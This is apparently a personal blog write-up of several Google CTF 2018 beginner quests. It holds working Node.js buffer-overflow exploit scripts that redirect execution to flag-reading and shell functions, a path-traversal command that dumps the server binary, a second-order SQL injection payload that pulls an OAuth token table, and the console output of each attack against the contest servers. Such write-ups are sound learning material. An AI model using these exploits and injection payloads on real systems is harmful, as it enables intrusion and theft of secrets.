# Stack Smashing at Google CTF 2018

The beginner's quests start to get hard, as a CTF beginner myself, I start to
have some hard time solving the quests. Hopefully I can still get the cake
though.

What cake? Oh, looks like I forgot to mention it, here's the main quest prompt:
```
Cakes... Throughout history they are long promised, not often delivered. Are
they real?

[...]

Your task, uncover the truth, find the cake and show it to the world. Set the
truth free.

[...]

Your goal is to get the cake in the fridge... Where else would you put cake in
your smart home?
```

Alright, let's smash some stacks.

## Message of The Day

After playing around a bit with the binary, I noticed that writting a large
input when setting new user MOTD would cause `SIGSEGV`, which smells like a
buffer overflow vulnerability. 

I then disassembled the binary with Hopper Disassembler like before, and found
that the function that prints the current user MOTD will pass my string into
`printf` as first argument. Although this let me easily crash the program, my
input isn't on the stack when it's printed, so exploiting this format string
vulnerability to get the flag would be rather difficult.

It's time to investigate whether buffer overflow can be exploited, I checked
the disassembly and found the instruction address right after reading user
input is `0x60606173`:

```
$ gdb motd
[...]

(gdb) break * 0x60606173
Breakpoint 1 at 0x60606173

(gdb) run
[...]
choice: 2
Enter new message of the day

New msg: ("A" repeated 0x100 times, the size of the buffer)
Breakpoint 1, 0x0000000060606173 in set_motd ()

(gdb) x/150xw $sp
[...]
0x7ffffffde1c0: 0x41414141      0x41414141      0x41414141      0x41414141
0x7ffffffde1d0: 0xfffde200      0x00007fff      0x60606373      0x00000000
[...]
```

Looks like I need 8 more characters to reach the return address. A quick
Node.js script can be used to encode the address of `read_flag` function,
`0x606063a5`:

```JavaScript
"use strict";

// Reverse to take care of the endianness
const read_flag_address = [0x60, 0x60, 0x63, 0xa5].reverse();

let payload = [
    Buffer.from("2"),
    Buffer.from("\n"),

    Buffer.from("A".repeat(0x100 + 8)), Buffer.from(read_flag_address),
    Buffer.from("\n"),

    Buffer.from("5"),
    Buffer.from("\n"),
];
payload = Buffer.concat(payload);

process.stdout.write(payload);
```

Let's try it:

```
$ node exploit | nc motd.ctfcompetition.com 1337
Choose functionality to test:
1 - Get user MOTD
2 - Set user MOTD
3 - Set admin MOTD (TODO)
4 - Get admin MOTD
5 - Exit
choice: Enter new message of the day
New msg: New message of the day saved!
Admin MOTD is: CTF{m07d_1s_r3t_2_r34d_fl4g}
```

Usually smashing the stack like this would cause `SIGABRT`, but apparently the
binary of this quest is compiled without stack cookies.

## Admin UI 2

It's time to log in using the flag from [last time](Google_CTF_2018_2.html):

```
[...]
1
Please enter the backdoo^Wservice password:

CTF{I_luv_buggy_sOFtware}
! Two factor authentication required !
Please enter secret secondary password:
```

Eh... Let's dump the binary as per hints from the quest prompt:

```
$ echo -e "2\n../../../proc/self/exe\n3" | nc mngmnt-iface.ctfcompetition.com 1337 > data.bin
```

This would include the menu text as well, I cleaned them with a text editor.
Surprisingly that didn't corrupt the binary. Hopper Disassembler can generate
C style pseudocode from binary:

```
int _Z15secondary_loginv() {
    puts("! Two factor authentication required !");
    puts("Please enter secret secondary password:");
    scanf("%127s", &var_90);
    rax = strlen(&var_90);
    var_10 = rax;
    for (var_8 = 0x0; var_8 < var_10; var_8 = var_8 + 0x1) {
            *(int8_t *)(var_8 + &var_90) = *(int8_t *)(var_8 + &var_90) & 0xff ^ 0xffffffc7;
    }
    if (var_10 == 0x23) {
            var_90 = *FLAG;
            if (&var_90 != 0x0) {
                    rax = 0x1;
            }
            else {
                    rax = 0x0;
            }
    }
    else {
            rax = 0x0;
    }
    if (rax != 0x0) {
            puts("Authenticated");
            rax = command_line();
    }
    else {
            puts("Access denied.");
            rax = exit(0x1);
    }
    return rax;
}
```

It didn't take long to find the function responsible for two factor
authentication, but the code still needs some cleaning:

```
function secondary_login() {
    print(prompt_text);

    char_array user_input = read_up_to_chars(127);
    for (int i = 0; i < get_length(user_input); i++)
        user_input[i] = user_input[i] ^ 0xc7;

    bool good;
    if (get_length(uer_input) == 0x23) {
        char_array flag = find_char_array(FLAG);
        if (found_char_array(flag))
            good = true;
        else
            good = false;
    } else {
        good = false;
    }

    if (good) {
        print("Authenticated");
        command_line();
    } else {
        print("Access denied.");
        exit_with_error(1);
    }
}
```

It's not valid C code, but the idea is easy to see. The secondary password can
be any string that is `0x23` or `35` characters long. I'll just use 35 `a`:

```
[...]
! Two factor authentication required !
Please enter secret secondary password:
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Authenticated

> shell
Security made us disable the shell, sorry!
```

Well, looks like I need to find another way. Looking back at the
`secondary_login` function, the XOR and the `FLAG` variables are extra
suspicious. The content of `FLAG` can be easily read out from disassembly:

```JavaScript
"use strict";

const flag = [
    [
        0x98, 0xa8, 0xb0, 0x93,
        0xbc, 0x81, 0x93, 0x84,
    ],
    [
        0x83, 0xb5, 0xa8, 0xb0,
        0x94, 0xb4, 0xa6, 0x97,
    ],
    [
        0xb5, 0xa2, 0xb3, 0xb3,
        0xa2, 0x85, 0x98, 0xbd,
    ],
    [
        0x98, 0xf6, 0x98, 0xa9,
        0xf3, 0xaf, 0xb3, 0x98,
    ],
    [
        0xf8, 0xac,
    ],
    [
        0xba,
    ],
];

for (const w of flag) {
    let i = w.length;
    while (i--) { // Takes care of the endianness
        process.stdout.write(String.fromCharCode(w[i] ^ 0xc7));
    }
}
```

XOR-ing each byte of `FLAG` with `0xc7` reveals the flag:
`CTF{Two_PasSworDz_Better_th4n_1_k?}`.

I'm not sure if it's a bug or intentional, but it would make more sense if the
`secondary_login` function actually validated the input. Anyway, `shell` is
still disabled, can it be enabled with some hacks?

## Admin UI 3

After checking the disassembly, I found that the buffer holding the input
command is 48 bytes long. Writting something very big will not crash the
program right away, that's because the current function doesn't return until
the `quit` command is received. After entering `quit`, the program gets
`SIGSEGV` (not `SIGABRT`). Looks like I can smash the stack and redirect code
execution again.

I also noticed that the `echo` command will pass my input to `printf` as first
argument, but the buffer is only 48 bytes long, exploiting this format string
vulnerability could be challenging.

Examining the symbols, the `debug_shell` function is the one that handles
the `shell` command (when it's enabled), following the same logic as Message
of The Day quest:

```JavaScript
"use strict";

const shell_address = [0x41, 0x41, 0x42, 0x27].reverse();

let payload = [
    Buffer.from("1"),
    Buffer.from("\n"),

    Buffer.from("CTF{I_luv_buggy_sOFtware}"),
    Buffer.from("\n"),

    Buffer.from("a".repeat(35)),
    Buffer.from("\n"),

    Buffer.from("A".repeat(48 + 8)), Buffer.from(shell_address),
    Buffer.from("\n"),

    Buffer.from("quit"),
    Buffer.from("\n"),

    Buffer.from("ls -al"),
    Buffer.from("\n"),

    Buffer.from("exit"),
    Buffer.from("\n"),
];
payload = Buffer.concat(payload);

process.stdout.write(payload);
```

Run it:

```
$ node exploit | nc mngmnt-iface.ctfcompetition.com 1337
=== Management Interface ===
 1) Service access
 2) Read EULA/patch notes
 3) Quit
Please enter the backdoo^Wservice password:
! Two factor authentication required !
Please enter secret secondary password:
Authenticated
> Unknown command 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'BAA'
> Bye!
total 144
drwxr-xr-x 3 user   user      4096 Jun 18 08:25 .
drwxr-xr-x 3 nobody nogroup   4096 May 25 13:19 ..
-rw-r--r-- 1 user   user       220 Aug 31  2015 .bash_logout
-rw-r--r-- 1 user   user      3771 Aug 31  2015 .bashrc
-rw-r--r-- 1 user   user       655 May 16  2017 .profile
-rw-r--r-- 1 nobody nogroup     26 May 24 15:03 an0th3r_fl44444g_yo
-rw-r--r-- 1 nobody nogroup     25 Jun 18 08:25 flag
-rwxr-xr-x 1 nobody nogroup 111128 Jun 18 08:25 main
drwxr-xr-x 2 nobody nogroup   4096 Jun 18 08:25 patchnotes
```

Looks like I found what I'm looking for:

```JavaScript
// [...]

    Buffer.from("cat an0th3r_fl44444g_yo"),
    Buffer.from("\n"),

// [...]
```

And the third flag is `CTF{c0d3ExEc?W411_pL4y3d}`.

## Gatekeeper

Only a file named `gatekeeper` is insize the ZIP attachment, what's it?

```
$ file gatekeeper
gatekeeper: ELF 64-bit LSB shared object, x86-64, [...], not stripped
$ ./gatekeeper
/===========================================================================\
|               Gatekeeper - Access your PC from everywhere!                |
+===========================================================================+
[ERROR] Login information missing
Usage: ./gatekeeper <username> <password>
```

It's usually a good idea to see what strings are embedded in the binary:

```
$ strings gatekeeper
[...]
 ~> Verifying.
0n3_W4rM
 ~> Incorrect username
zLl1ks_d4m_T0g_I
Correct!
[...]
$ ./gatekeeper 0n3_W4rM zLl1ks_d4m_T0g_I
/===========================================================================\
|               Gatekeeper - Access your PC from everywhere!                |
+===========================================================================+
 ~> Verifying.......ACCESS DENIED
 ~> Incorrect password
```

Finding the fishy strings weren't too hard, but they don't work. After staring
at the second string a few seconds, it reads `I got mad skills` backward. Is
that it?

```
$ ./gatekeeper 0n3_W4rM I_g0T_m4d_sk1lLz
/===========================================================================\
|               Gatekeeper - Access your PC from everywhere!                |
+===========================================================================+
 ~> Verifying.......Correct!
Welcome back!
CTF{I_g0T_m4d_sk1lLz}
```

Yep, that's it.

## Media-DB

The source code of the server is attached, let's have a look:


```Python
# [...]
c.execute("CREATE TABLE oauth_tokens (oauth_token text)")
c.execute("CREATE TABLE media (artist text, song text)")
c.execute("INSERT INTO oauth_tokens VALUES ('{}')".format(flag))
# [...]
  if choice == '1':
    my_print("artist name?")
    artist = raw_input().replace('"', "")
    my_print("song name?")
    song = raw_input().replace('"', "")
    c.execute("""INSERT INTO media VALUES ("{}", "{}")""".format(artist, song))
  elif choice == '2':
    my_print("artist name?")
    artist = raw_input().replace("'", "")
    print_playlist("SELECT artist, song FROM media WHERE artist = '{}'".format(artist))
  elif choice == '3':
    my_print("song name?")
    song = raw_input().replace("'", "")
    print_playlist("SELECT artist, song FROM media WHERE song = '{}'".format(song))
  elif choice == '4':
    artist = random.choice(list(c.execute("SELECT DISTINCT artist FROM media")))[0]
    my_print("choosing songs from random artist: {}".format(artist))
    print_playlist("SELECT artist, song FROM media WHERE artist = '{}'".format(artist))
# [...]
```

It's clearly SQL Injection vulnerability, but quotes are removed and `\n` would
mark the end of input. I tried a few classic SQL Injection payloads but nothing
worked. Examining the source code closely, I noticed the removed quotes in
choice 1 is `"` but it's `'` in choices 2 ad 3. Choice 4 doesn't escape quotes,
but the artist must be already in the database.

After playing around with it a bit, I noticed that I can have `'` in artist
name, which is later not escaped in choice 4. It's time to craft a query that
would print the flag:

```SQL
SELECT artist, song FROM media WHERE artist = '' UNION SELECT 'flag', oauth_token FROM oauth_tokens
```

Putting into classic SQL Injection format:

```
' UNION SELECT 'flag', oauth_token FROM oauth_tokens; --
```

Let's try it:

```
$ nc media-db.ctfcompetition.com 1337
=== Media DB ===
1) add song
2) play artist
3) play song
4) shuffle artist
5) exit

> 1
artist name?
' UNION SELECT 'flag', oauth_token FROM oauth_tokens; --
song name?
b

[...]
> 4
choosing songs from random artist: ' UNION SELECT 'flag', oauth_token FROM oauth_tokens; --

== new playlist ==
1: "CTF{fridge_cast_oauth_token_cahn4Quo}
" by "flag"
```

## I'm Almost There!

I'm almost done the beginner's quests! Hopefully I can see my cakes soon.
